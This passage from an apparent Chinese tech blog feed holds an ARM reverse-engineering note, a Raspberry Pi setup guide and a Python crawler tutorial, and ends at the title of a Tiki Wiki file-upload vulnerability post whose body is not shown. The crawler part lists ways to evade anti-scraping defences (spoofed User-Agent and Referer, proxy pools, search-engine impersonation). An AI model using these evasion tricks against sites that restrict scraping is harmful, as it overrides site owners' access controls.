id="生成thumb代码"><a href="#生成thumb代码" class="headerlink" title="生成thumb代码"></a>生成thumb代码</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/jkcGKL7fbH.png?imageslim" alt="mark"><br>BL的下一条指令的地址被保存在LR寄存器中</p><p>调用gcc的内建函数，R0作为参数</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/7EilLlHJfE.png?imageslim" alt="mark"></p><p>==R1=LR=57C（待调试）==</p><p>==R1=R1+2=57E（待调试）==</p><font color="#ff0000"><strong>地址做移位是为了对齐（如这里的R1），而数移位是为了做乘除法（如这里的R0）</strong></font><p>LSRS:  R1=R1右移两位</p><p>LSLS：R0=R0左移两位=R0*4</p><p>LSLS：R1=R1左移两位 //<strong>先右移再左移，清除R1原来的最低位，用于对齐，</strong>==得到0x580（待调试）==</p><p>LDR：R0=[R1+R0] =[580+原来的R0<em>4] //假设原来的R0=1，则R0=[580+原来R0</em>4]=[580+4]=[0x584]=<strong>loc_59C-0x580</strong></p><p>ADDS: R0=R0+R1=loc_59C</p><p>MOV: LR=loc_59C</p><p>POP: 恢复寄存器R0，R1</p><p>MOV: PC=loc_59C;函数结束，跳转到case：选中的代码块</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/7dha4ei960.png?imageslim" alt="mark"></p><p>这些不是代码，是长为4字节的数据项，每一项都是偏移值，<strong>这个偏移值+0x580就能找到真正的代码</strong></p><h2 id="生成ARM代码"><a href="#生成ARM代码" class="headerlink" title="生成ARM代码"></a>生成ARM代码</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/e64JgLd8gc.png?imageslim" alt="mark"></p><p>ADDLS：PC=PC+（R3*4）</p><p>PC的PC寄存器指向的不是下条指令，是下下条指令（也就是当前指令地址+8）</p><h6 id="CEMU测试"><a href="#CEMU测试" class="headerlink" title="CEMU测试"></a>CEMU测试</h6><h6 id="bl-funl-把LR设置为BL指令的下一条地址"><a href="#bl-funl-把LR设置为BL指令的下一条地址" class="headerlink" title="bl funl //把LR设置为BL指令的下一条地址"></a>bl funl //把LR设置为BL指令的下一条地址</h6><h6 id="fun1"><a href="#fun1" class="headerlink" title="fun1:"></a>fun1:</h6><h6 id="mov-r0-pc"><a href="#mov-r0-pc" class="headerlink" title="mov r0,pc"></a>mov r0,pc</h6><h6 id="mov-r1-lr"><a href="#mov-r1-lr" class="headerlink" title="mov r1,lr"></a>mov r1,lr</h6><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/KKmHecaK8C.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/D69cGmkeCF.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/G319AEKc61.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/k7eHK6CLmf.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/4FgIA8aDcm.png?imageslim" alt="mark"></p><p>差了8个字节</p><h2 id="关于ARM中的寄存器PC"><a href="#关于ARM中的寄存器PC" class="headerlink" title="关于ARM中的寄存器PC"></a>关于ARM中的寄存器PC</h2><p><a href="http://blog.csdn.net/tigerjibo/article/details/6050649" target="_blank" rel="noopener">http://blog.csdn.net/tigerjibo/article/details/6050649</a></p><p><a href="http://blog.csdn.net/lee244868149/article/details/49488575" target="_blank" rel="noopener">http://blog.csdn.net/lee244868149/article/details/49488575</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/8Fg5394hJj.png?imageslim" alt="mark"></p><p>从图中可以看出，一条汇编指令的运行有三个步骤，取指、译码、执行，当第一条汇编指令取指完成后，紧接着就是第二条指令的取指，然后第三条…如此嵌套</p><p>其实很容易看出，第一条指令：</p><p>add r0, r1,$5</p><p>取指完成后，PC就指向了第二条指令，此时PC=PC+4</p><p>当第一条指令译码完成以后，此时PC=PC+8</p><p>所以第一条指令开始执行时，PC值已经加了8</p><p>所以必须记住这个前提，在arm中，每次该指令执行时，其实这时的PC值是PC=PC+8</p><p>而且这个前提也同样适合多级流水线，原因就不解释了</p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>树莓派快速配置指南</title>
      <link href="/2018/01/15/raspberry_quick_start/"/>
      <url>/2018/01/15/raspberry_quick_start/</url>
      <content type="html"><![CDATA[<h2 id="1-下载烧录镜像"><a href="#1-下载烧录镜像" class="headerlink" title="1. 下载烧录镜像"></a>1. 下载烧录镜像</h2><p><a href="http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/" target="_blank" rel="noopener">镜像下载地址</a></p><p><a href="http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/" target="_blank" rel="noopener">http://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/</a></p><p>写入sd卡（需要一个读卡器</p><p><a href="https://etcher.io/" target="_blank" rel="noopener">下载etcher</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/jhlaJBmHh2.png?imageslim" alt="mark"></p><h2 id="2-镜像烧好后"><a href="#2-镜像烧好后" class="headerlink" title="2. 镜像烧好后"></a>2. 镜像烧好后</h2><p><strong>在boot路径下新建一个命名为ssh(无后缀）的空白文件,使得ssh默认开启。</strong></p><p>参考这个用一根网线连接电脑去操作（windows）<br> <a href="http://shumeipai.nxez.com/2013/10/15/raspberry-pi-and-a-network-cable-directly-connected-laptop.html" target="_blank" rel="noopener">http://shumeipai.nxez.com/2013/10/15/raspberry-pi-and-a-network-cable-directly-connected-laptop.html</a></p><p> 或者和我一样用一根网线直接插在路由器后面</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/jI44KDfLbD.png?imageslim" alt="mark"></p><p>也可以不用网线，直接配置无线上网，不赘述。<a href="http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html" target="_blank" rel="noopener">http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html</a></p><h2 id="3-远程连接"><a href="#3-远程连接" class="headerlink" title="3.远程连接"></a>3.远程连接</h2><p>找到ip后用ssh远程连接，默认账号密码为</p><p>user:pi</p><p>password:raspberry</p><h2 id="4-换源"><a href="#4-换源" class="headerlink" title="4.换源"></a>4.换源</h2><p>修改/etc/apt/sources.list为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># deb http://mirrordirector.raspbian.org/raspbian/ jessie main contrib non-free rpi</span><br><span class="line"># Uncomment line below then &apos;apt-get update&apos; to enable &apos;apt-get source&apos;</span><br><span class="line"># deb-src http://archive.raspbian.org/raspbian/ jessie main contrib non-free rpi</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ jessie main ui</span><br></pre></td></tr></table></figure><p>sudo apt-get update</p><h2 id="5-安装vim"><a href="#5-安装vim" class="headerlink" title="5.安装vim"></a>5.安装vim</h2><p>sudo apt-get install vim</p><h2 id="6-释放限制空间（封印解除"><a href="#6-释放限制空间（封印解除" class="headerlink" title="6.释放限制空间（封印解除"></a>6.释放限制空间（封印解除</h2><p>sudo raspi-config</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/7GK1f062B3.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/fmG7j880l6.png?imageslim" alt="mark"></p><h2 id="打开vnc"><a href="#打开vnc" class="headerlink" title="打开vnc"></a>打开vnc</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/g5GE31H6j6.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/2l93FIKKIB.png?imageslim" alt="mark"></p><h4 id="vnc开机自启动设置"><a href="#vnc开机自启动设置" class="headerlink" title="vnc开机自启动设置"></a>vnc开机自启动设置</h4><p>vim  /etc/init.d/vncserver</p><p>然后 复制下面的内容 右键粘贴进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          vncserver</span><br><span class="line"># Required-Start:    $local_fs</span><br><span class="line"># Required-Stop:     $local_fs</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: Start/stop vncserver</span><br><span class="line">### END INIT INFO</span><br><span class="line"> </span><br><span class="line"># More details see:</span><br><span class="line"># http://www.penguintutor.com/linux/vnc</span><br><span class="line"> </span><br><span class="line">### Customize this entry</span><br><span class="line"># Set the USER variable to the name of the user to start vncserver under</span><br><span class="line">export USER=&apos;pi&apos;</span><br><span class="line">### End customization required</span><br><span class="line"> </span><br><span class="line">eval cd ~$USER</span><br><span class="line"> </span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">    # 启动命令行。此处自定义分辨率、控制台号码或其它参数。</span><br><span class="line">    su $USER -c &apos;/usr/bin/vncserver -depth 16 -geometry 1024x768 :1&apos;</span><br><span class="line">    echo &quot;Starting VNC server for $USER &quot;</span><br><span class="line">    ;;</span><br><span class="line">  stop)</span><br><span class="line">    # 终止命令行。此处控制台号码与启动一致。</span><br><span class="line">    su $USER -c &apos;/usr/bin/vncserver -kill :1&apos;</span><br><span class="line">    echo &quot;vncserver stopped&quot;</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    echo &quot;Usage: /etc/init.d/vncserver &#123;start|stop&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure></p><h5 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h5><p>sudo chmod 755 /etc/init.d/vncserver</p><h5 id="添加开机启动项"><a href="#添加开机启动项" class="headerlink" title="添加开机启动项"></a>添加开机启动项</h5><p>sudo update-rc.d vncserver defaults</p><h5 id="最后-重启树莓派"><a href="#最后-重启树莓派" class="headerlink" title="最后 重启树莓派"></a>最后 重启树莓派</h5><p>sudo reboot</p><h5 id="安装VNC-Viewer"><a href="#安装VNC-Viewer" class="headerlink" title="安装VNC Viewer"></a>安装VNC Viewer</h5><p>链接：<a href="https://pan.baidu.com/s/1jJAy7bg" target="_blank" rel="noopener">https://pan.baidu.com/s/1jJAy7bg</a> 密码：gnyy</p><p>输入ip:1</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/9dC1C8d8Eg.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/eBh80HfKlB.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/0bbcHg69fD.png?imageslim" alt="mark"></p>]]></content>
      
      <categories>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pi酱 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python爬虫的入门与进阶</title>
      <link href="/2017/05/18/crawler/"/>
      <url>/2017/05/18/crawler/</url>
      <content type="html"><![CDATA[<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/171045447.jpg" alt="mark"><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/171146510.png" alt="mark"></p><h2 id="书籍推荐："><a href="#书籍推荐：" class="headerlink" title="书籍推荐："></a>书籍推荐：</h2><p>《python核心编程》/《python语言及其应用》-&gt;《python cookbook》 </p><p>《用Python写网络爬虫》</p><h2 id="python-爬虫实践文章"><a href="#python-爬虫实践文章" class="headerlink" title="python/爬虫实践文章"></a>python/爬虫实践文章</h2><p><a href="https://juejin.im/post/58dce2248d6d8100613a4cfb" target="_blank" rel="noopener">https://juejin.im/post/58dce2248d6d8100613a4cfb</a></p><p><a href="https://zhuanlan.zhihu.com/p/21479334" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21479334</a></p><p><a href="https://zhuanlan.zhihu.com/p/25633789" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25633789</a></p><p><a href="https://xlzd.me/tag/crawler/" target="_blank" rel="noopener">https://xlzd.me/tag/crawler/</a></p><p><a href="http://dongweiming.github.io/Expert-Python/#1" target="_blank" rel="noopener">http://dongweiming.github.io/Expert-Python/#1</a></p><h2 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h2><p>熟悉了python语法之后，写了一两个就入门了。网上有很多爬虫的文章，<strong>但是一定要自己动手去写</strong></p><p><strong>初级文章读一百篇和读一两篇是一样的，除了浪费时间以外。</strong> </p><p>另外，初学者没必要一上来就做很大很有成就感的事情，可以先写个简单的，然后不断给自己正向反馈。</p><p>比如可以先只是将数据在终端打印出来，然后再渐渐将数据规整化了以后保存到本地的数据库或者文件里面，然后再考虑提高效率，还有一些比较高深的技巧，比如研究分布式呀、断点续爬，怎么控制不同的worker。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/172146533.png" alt="mark"></p><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/160246823.png" alt="mark"></p><h2 id="怎么使用这个思维导图？"><a href="#怎么使用这个思维导图？" class="headerlink" title="怎么使用这个思维导图？"></a>怎么使用这个思维导图？</h2><p>先从右上角开始，了解http的内容，然后再学抓取工具。</p><h3 id="关于抓取工具"><a href="#关于抓取工具" class="headerlink" title="关于抓取工具"></a>关于抓取工具</h3><ul><li>Chrome和firebug选其一即可。</li><li>Tamper Data是一个篡改数据、截停请求的调试器。</li><li>fiddler 能记录所有客户端的http和https请求，监视、设置断点，修改输入输出的数据。</li><li>Charles 抓包工具，主要用来抓取手机的包。Web端的抓取策略可能比较复杂和严格，但是在移动端要简单的多。我一般写爬虫就是先看一下有没有开放的API，如果没有的话再看手机端。<br><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDk1NjI0OQ==&amp;mid=2247483927&amp;idx=1&amp;sn=3c7be971f8baf5a3d9e4e55b700aba0f&amp;chksm=9f76aea1a80127b70fe3f777a1cfe2c2c4a54c84e5c99772f528d0bf8d606d472675330558fe#rd" target="_blank" rel="noopener">移动端爬虫的一个栗子</a>    </li></ul><h3 id="关于请求库"><a href="#关于请求库" class="headerlink" title="关于请求库"></a>关于请求库</h3><p>个人最推荐requests而完全不推荐按照urllib或者urllib2的方式来写。因为requests帮你考虑的东西更多，比如标准库里往往是默认不支持gzip压缩的，而requests会自动的压缩，而这往往能减少大量的压缩时间。<br>此外，由于历史原因，标准库的写法冗杂而不优雅，比起高度封装的requests用起来要麻烦的多。</p><p>举个栗子：</p><p>①urllib2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> cookielib <span class="keyword">import</span> CookieJar</span><br><span class="line"></span><br><span class="line">hb_url = <span class="string">'https://httpbin.org/basic-auth/user/pass'</span></span><br><span class="line"></span><br><span class="line">req = urllib2.Request(hb_url)</span><br><span class="line"></span><br><span class="line">password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()</span><br><span class="line">password_manager.add_password(<span class="keyword">None</span>, hb_url, <span class="string">'user'</span>, <span class="string">'pass'</span>)</span><br><span class="line"></span><br><span class="line">auth_manager = urllib2.HTTPBasicAuthHandler(password_manager)</span><br><span class="line"></span><br><span class="line">cj = CookieJar()</span><br><span class="line">cookie_manager = urllib2.HTTPCookieProcessor(cj)</span><br><span class="line"></span><br><span class="line">proxy_handler = urllib2.ProxyHandler(&#123;<span class="string">'http'</span>: <span class="string">'127.0.0.1'</span>&#125;)</span><br><span class="line"></span><br><span class="line">opener = urllib2.build_opener(auth_manager, cookie_manager, proxy_handler)</span><br><span class="line"></span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line"></span><br><span class="line">handler = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> handler.getcode()</span><br><span class="line"><span class="keyword">print</span> handler.headers.getheader(<span class="string">'content-type'</span>)</span><br><span class="line">data = json.load(handler)</span><br><span class="line"><span class="keyword">print</span> data[<span class="string">'authenticated'</span>]</span><br><span class="line"><span class="comment"># ------</span></span><br><span class="line"><span class="comment"># 200</span></span><br><span class="line"><span class="comment"># 'application/json'</span></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure></p><p>②requests<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">hb_url = <span class="string">'https://httpbin.org/basic-auth/user/pass'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://127.0.0.1'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(hb_url, auth=(<span class="string">'user'</span>, <span class="string">'pass'</span>), proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.status_code</span><br><span class="line"><span class="keyword">print</span> r.headers[<span class="string">'content-type'</span>]</span><br><span class="line"><span class="keyword">print</span> r.json()[<span class="string">'authenticated'</span>]</span><br></pre></td></tr></table></figure></p><h3 id="关于解析库"><a href="#关于解析库" class="headerlink" title="关于解析库"></a>关于解析库</h3><ul><li>beautiful soap: 页面处理更友好，代码直观，但是解析比较慢，对于页面的处理比较绕。</li><li>Xpath+lxml:最推荐，可以直接用一个表达式找到要找的内容，而bs就没这么方便，它要一层一层的去循环。<br><a href="http://www.w3school.com.cn/xhtml/index.asp" target="_blank" rel="noopener">学习xml</a></li><li>re</li></ul><h3 id="关于并发编程"><a href="#关于并发编程" class="headerlink" title="关于并发编程"></a>关于并发编程</h3><ul><li>不推荐twisted;asyncio是未来的趋势，推荐。<a href="https://github.com/dongweiming/weapp-zhihulive" target="_blank" rel="noopener">知乎Live微信小程序 &amp; asyncio爬虫</a></li></ul><h3 id="关于任务调度框架"><a href="#关于任务调度框架" class="headerlink" title="关于任务调度框架"></a>关于任务调度框架</h3><ul><li>celery：分布式任务队列</li><li>huey:推荐小规模的爬虫需求使用，也推荐读一下它的源码。<a href="https://github.com/coleifer/huey" target="_blank" rel="noopener">https://github.com/coleifer/huey</a></li></ul><h2 id="抓取的流程图"><a href="#抓取的流程图" class="headerlink" title="抓取的流程图"></a>抓取的流程图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/181125978.png" alt="mark"></p><p><strong>发送网络请求-&gt;下载好数据后解析html-&gt;解析成想要的格式之后存储</strong></p><h2 id="celery的流程图"><a href="#celery的流程图" class="headerlink" title="celery的流程图"></a>celery的流程图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/181411194.png" alt="mark"></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/194754070.png" alt="mark"></h2><p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="noopener">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live1.mp4</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/195002034.png" alt="mark"><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/195015479.png" alt="mark"></p><p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="noopener">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live2.mp4</p><h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><p>AJAX出现的较早，在分离这上面做的不是很好，大厂都已经迁移到了Fetch上。<br><a href="https://github.com/camsong/blog/issues/2" target="_blank" rel="noopener">https://github.com/camsong/blog/issues/2</a></p><h2 id="动态网页抓取"><a href="#动态网页抓取" class="headerlink" title="动态网页抓取"></a>动态网页抓取</h2><p>关于动态网页的抓取是一件比较困难的事情。有些动态页面可以从接口直接获取数据，但是有一些不行，比如：</p><ul><li>用到了现在比较潮流的框架，比如react；</li><li>有些需要页面交互才能获取到数据，比如点个按钮</li><li>有些是在javascript执行之后生成的。<br>这种时候就必须要了解这个过程中是怎么实现渲染的，我们要考虑一个动态页面的抓取的过程。</li></ul><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><strong>业界动态网页的抓取，常使用selenium + phantomjs，其实就像是打开浏览器，设定一些操作和事件，来模仿一个真实的用户，再通过它提供的接口找到要爬取的元素，拿到它的值。</strong><br>selenium本来是用来做自动化测试的，还能做鼠标拖动、截屏之类的操作。<br>phantomjs是一个没有web界面的，可脚本编程的webkit浏览器引擎，可以进行CSS、DOM操作等等。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/204226753.png" alt="mark"></p><p>链接：<a href="http://pan.baidu.com/s/1skDyoUT" target="_blank" rel="noopener">http://pan.baidu.com/s/1skDyoUT</a> 密码：3tsi 就是那个live3.mp4</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDk1NjI0OQ==&amp;mid=2247483737&amp;idx=1&amp;sn=3f44134e630408c9b950f7d513722059&amp;chksm=9f76adefa80124f94d0d0faa8751530636cb9863e9af9d6c56475719b57c105aa611423d5656#rd" target="_blank" rel="noopener">几篇celery的文章（一）</a><br><a href="http://www.bjhee.com/celery.html" target="_blank" rel="noopener">几篇celery的文章（二）</a><br><a href="http://funhacks.net/2016/12/13/celery/" target="_blank" rel="noopener">几篇celery的文章（三）</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/210110160.png" alt="mark"></p><p>很多人会纠结于是用多线程多进程还是asyncio呢，要不要学习twisted呢？其实不需要纠结，先实现功能。</p><p>其实主要的性能瓶颈在于要爬取的网站的网络延时、页面渲染的速度还有反爬虫策略。</p><p>当然爬虫本身性能可优化的地方也很多，这里有一些建议</p><ol><li>并发或者分布式的方式去爬取。</li><li>使用队列减少数据库的访问。</li><li>按需对数据写操作，从单个执行变成批量执行。（通常是先存在某个地方，比如reddis,然后调一个批量任务定期抓取）</li><li>选择合适的数据库建立正确的索引。如果早期对需求不清楚不确定，用Nosql（比如Mongodb）方便很多，即使数据脏了也可以通过程序处理。</li><li>并发效率并不是线性的，并发数高了对网站和数据库还是有负担。<br>……</li></ol><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170518/211427350.png" alt="mark"></p><h2 id="对付常用的反爬虫策略"><a href="#对付常用的反爬虫策略" class="headerlink" title="对付常用的反爬虫策略"></a>对付常用的反爬虫策略</h2><h3 id="设置IP的访问频率"><a href="#设置IP的访问频率" class="headerlink" title="设置IP的访问频率"></a>设置IP的访问频率</h3><p>如果超出一定的频率就会出现验证码。处理验证码可以专门写程序处理，也可以使用开源项目。</p><p><em>推荐的生成验证码图片的项目 <a href="https://github.com/lepture/captcha" target="_blank" rel="noopener">https://github.com/lepture/captcha</a> </em></p><h3 id="伪造User-Agent"><a href="#伪造User-Agent" class="headerlink" title="伪造User Agent"></a>伪造User Agent</h3><p>一直用一个UA会被开发工程师发现。</p><h3 id="建立IP代理池"><a href="#建立IP代理池" class="headerlink" title="建立IP代理池"></a>建立IP代理池</h3><p><em>获取大量免费代理ip的项目<a href="https://github.com/awolfly9/IPProxyTool" target="_blank" rel="noopener">https://github.com/awolfly9/IPProxyTool</a>  </em></p><h3 id="改变refer值"><a href="#改变refer值" class="headerlink" title="改变refer值"></a>改变refer值</h3><p>不直接访问，伪造refer</p><h3 id="模仿搜索引擎"><a href="#模仿搜索引擎" class="headerlink" title="模仿搜索引擎"></a>模仿搜索引擎</h3><p>有可能被打上好人卡~</p><h3 id="保存cookie，使用cookie免登陆"><a href="#保存cookie，使用cookie免登陆" class="headerlink" title="保存cookie，使用cookie免登陆"></a>保存cookie，使用cookie免登陆</h3><h2 id="关于反反爬虫的项目"><a href="#关于反反爬虫的项目" class="headerlink" title="关于反反爬虫的项目"></a>关于反反爬虫的项目</h2><p><strong>推荐的项目：<a href="https://github.com/luyishisi/Anti-Anti-Spider" target="_blank" rel="noopener">https://github.com/luyishisi/Anti-Anti-Spider</a></strong></p><h2 id="学习典例"><a href="#学习典例" class="headerlink" title="学习典例"></a>学习典例</h2><p>爬虫入门：<br><a href="https://zhuanlan.zhihu.com/p/21479334" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21479334</a></p><p>知道创宇面试题：<br><a href="http://www.dongwm.com/archives/pa-chong-lian-xi/" target="_blank" rel="noopener">http://www.dongwm.com/archives/pa-chong-lian-xi/</a></p><p>搜狐面试：<br><a href="https://github.com/dongweiming/mtime" target="_blank" rel="noopener">https://github.com/dongweiming/mtime</a></p><p><strong>awesome（个人推荐）：</strong></p><p><a href="https://github.com/BruceDone/awesome-crawler" target="_blank" rel="noopener">https://github.com/BruceDone/awesome-crawler</a></p><p><a href="https://github.com/liinnux/awesome-crawler-cn" target="_blank" rel="noopener">https://github.com/liinnux/awesome-crawler-cn</a></p><p><a href="https://github.com/facert/awesome-spider" target="_blank" rel="noopener">https://github.com/facert/awesome-spider</a></p><p><a href="https://github.com/aosabook/500lines/tree/master/crawler/code" target="_blank" rel="noopener">https://github.com/aosabook/500lines/tree/master/crawler/code</a></p><p>scrapy +redis+mongodb进行分布式爬虫 </p><p><a href="https://github.com/gnemoug/distribute_crawler" target="_blank" rel="noopener">https://github.com/gnemoug/distribute_crawler</a></p><p>技术选型： </p><ul><li>mongodb:存储爬取的结果（因为它不要求字段的数据结构严格一致化，对脏数据的容错性好）</li><li>redis:分布式/消息队列/一级缓存（存储中间数据）</li><li>scrapy:爬虫里最好的一个框架，基于twisted，高度封装。</li></ul><p>scrapy+django拓展</p><p><a href="https://github.com/scrapy-plugins/scrapy-djangoitem" target="_blank" rel="noopener">https://github.com/scrapy-plugins/scrapy-djangoitem</a></p><h2 id="爬虫情景"><a href="#爬虫情景" class="headerlink" title="爬虫情景"></a>爬虫情景</h2><h3 id="对腾讯视频、优酷视频的评论、播放量等的采集"><a href="#对腾讯视频、优酷视频的评论、播放量等的采集" class="headerlink" title="对腾讯视频、优酷视频的评论、播放量等的采集"></a>对腾讯视频、优酷视频的评论、播放量等的采集</h3><p>打开网页，弹一个h5或flash的播放器，会请求后端发送视频资源。 </p><ul><li>页面打开后渲染的第一页就是评论，然后其他页在你翻页或者滚动的时候通过ajax再去加载出来。</li><li>刚开始打开页面的时候，底下就没有评论。在后期通过ajax请求过来。相当于视频加载和评论加载（或者其他）分开进行。</li></ul><p><strong> 一般是不可能打开页面后全部评论加载出来的 </strong></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>tiki_wiki（&lt;=15.1）任意文件上传漏洞</title>
      <link href="/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/"/>
      <url>/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/</url>
